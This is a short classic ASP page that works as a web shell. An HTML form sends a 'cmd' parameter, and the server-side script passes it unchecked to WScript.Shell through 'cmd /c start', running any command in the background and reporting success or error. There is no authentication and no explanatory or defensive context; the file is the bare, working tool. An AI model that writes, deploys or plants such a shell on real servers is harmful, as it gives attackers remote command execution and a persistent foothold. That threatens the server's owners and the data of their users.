<HTML>
<BODY>
<FORM action="" method="GET">
    <label for="cmd"><b>Enter a command:</b></label><br>
    <input type="text" id="cmd" name="cmd" size=50 placeholder="Type your command here...">
    <input type="submit" value="Execute">
</FORM>
<PRE>
<%

Dim szCMD
szCMD = Request.QueryString("cmd")

If szCMD <> "" Then
    Dim objShell
    Set objShell = Server.CreateObject("WScript.Shell")

    On Error Resume Next
    objShell.Run "cmd /c start """" " & szCMD, 0, False

    If Err.Number = 0 Then
        Response.Write("<b>Command executed in background.</b>")
    Else
        Response.Write("<b>Error executing command:</b> " & Err.Description)
    End If

    On Error GoTo 0
    Set objShell = Nothing
Else
    Response.Write("<b>No command was entered.</b>")
End If

%>
</PRE>
</BODY>
</HTML>
